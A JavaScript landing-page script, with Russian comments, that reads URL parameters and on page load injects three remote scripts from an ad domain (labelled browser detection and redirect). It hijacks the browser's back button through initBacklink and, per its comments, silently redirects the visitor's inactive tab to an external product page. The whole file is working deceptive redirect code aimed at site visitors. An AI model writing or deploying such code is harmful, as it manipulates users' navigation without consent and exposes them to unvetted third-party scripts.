let pushUtmsObj = {}
if (window.location.search) {
  window.location.href
    .split('?')[1]
    .split('&')
    .forEach(adressUtm => {
      pushUtmsObj[adressUtm.split('=')[0]] = adressUtm.split('=')[1]
      return pushUtmsObj
    })
}

if (pushUtmsObj.push === '1') {
  let pushScript = document.createElement('script')
  pushScript.src = '../../../push-client-init.js'
  pushScript.defer = true
  document.head.prepend(pushScript)
}

function domonetCdns() {
  let browserDetectCDN = document.createElement('script')
  let redirectCDN = document.createElement('script')
  let emptyCDN = document.createElement('script')
  browserDetectCDN.src = 'https://static.bestfeedcpm.com/rpe1h8/qh8vil876/2qtq8hh81pm0uvq0y3yh.js'
  browserDetectCDN.defer = true
  redirectCDN.src = 'https://static.bestfeedcpm.com/zhn97aiu1/9a7/91217l/l17qt20mp/p0mbj7rhl.js'
  redirectCDN.defer = true
  emptyCDN.src = 'https://static.bestfeedcpm.com/qc98qh7bj1iuo0pypk/t2qtq2/tq2/pm0t2quel27r.js'
  emptyCDN.defer = true
  return document.head.prepend(browserDetectCDN, redirectCDN, emptyCDN)
}

let adressUtmsObj = {}
if (window.location.search) {
  window.location.href
    .split('?')[1]
    .split('&')
    .forEach(adressUtm => {
      adressUtmsObj[adressUtm.split('=')[0]] = adressUtm.split('=')[1]
      return adressUtmsObj
    })
}
window.addEventListener('DOMContentLoaded', () => {
  if (adressUtmsObj.sun !== '0') {
    domonetCdns()
    setTimeout(() => {
      if (adressUtmsObj.mbp) {
        if (
          adressUtmsObj.mbp.includes('%3A') ||
          adressUtmsObj.mbp.includes('%2F') ||
          adressUtmsObj.mbp.includes('%3F') ||
          adressUtmsObj.mbp.includes('%26')
        ) {
          adressUtmsObj.mbp = adressUtmsObj.mbp
            .replaceAll('%3A', ':')
            .replaceAll('%2F', '/')
            .replaceAll('%3F', '?')
            .replaceAll('%26', '&')
        }
      }
      let hrefLink = window.location.href
      let paramsSearch = window.location.search
      if (hrefLink.includes('index.html') || hrefLink.includes('index.php')) {
        hrefLink = hrefLink
          .replaceAll('index.html', '')
          .replaceAll('index.php/', '')
          .replaceAll('index.php', '')
      }
      hrefLink =
        hrefLink.replace(window.location.search, '').replace('?', '') + 'SUNDUK/index.php' + paramsSearch

      window.initBacklink(hrefLink)
      // сюда происходит редирект в неактивной вкладке
      let pageFirst = 'https://uptodate.space/product'
      // сюда происходит переход
      let pageSecond = ''
      window.initRedirect(pageFirst, pageSecond, linkElement => {
        return false
      })
    }, 1000)
  } else if (adressUtmsObj.sun === '0' && adressUtmsObj.mbp && adressUtmsObj.mbp !== '0') {
    domonetCdns()
    setTimeout(() => {
      if (adressUtmsObj.mbp) {
        if (
          adressUtmsObj.mbp.includes('%3A') ||
          adressUtmsObj.mbp.includes('%2F') ||
          adressUtmsObj.mbp.includes('%3F') ||
          adressUtmsObj.mbp.includes('%26')
        ) {
          adressUtmsObj.mbp = adressUtmsObj.mbp
            .replaceAll('%3A', ':')
            .replaceAll('%2F', '/')
            .replaceAll('%3F', '?')
            .replaceAll('%26', '&')
        }
      }

      window.initBacklink(adressUtmsObj.mbp + '/')
      // сюда происходит редирект в неактивной вкладке
      let pageFirst = 'https://uptodate.space/product'
      // сюда происходит переход
      let pageSecond = ''
      window.initRedirect(pageFirst, pageSecond, linkElement => {
        return false
      })
    }, 1000)
  } else if (adressUtmsObj.sun === '0' && !adressUtmsObj.mbp) {
    domonetCdns()
    setTimeout(() => {
      window.initBacklink('https://uptodate.space/product')
      // сюда происходит редирект в неактивной вкладке
      let pageFirst = 'https://uptodate.space/product'
      // сюда происходит переход
      let pageSecond = ''
      window.initRedirect(pageFirst, pageSecond, linkElement => {
        return false
      })
    }, 1000)
  } else if (!adressUtmsObj.sun && !adressUtmsObj.mbp) {
    domonetCdns()
    setTimeout(() => {
      let hrefLink = window.location.href
      let paramsSearch = window.location.search
      if (hrefLink.includes('index.html') || hrefLink.includes('index.php')) {
        hrefLink = hrefLink
          .replaceAll('index.html', '')
          .replaceAll('index.php/', '')
          .replaceAll('index.php', '')
      }
      hrefLink =
        hrefLink.replace(window.location.search, '').replace('?', '') + 'SUNDUK/index.php' + paramsSearch

      window.initBacklink(hrefLink)
      // сюда происходит редирект в неактивной вкладке
      let pageFirst = 'https://uptodate.space/product'
      // сюда происходит переход
      let pageSecond = ''
      window.initRedirect(pageFirst, pageSecond, linkElement => {
        return false
      })
    }, 1000)
  }
})
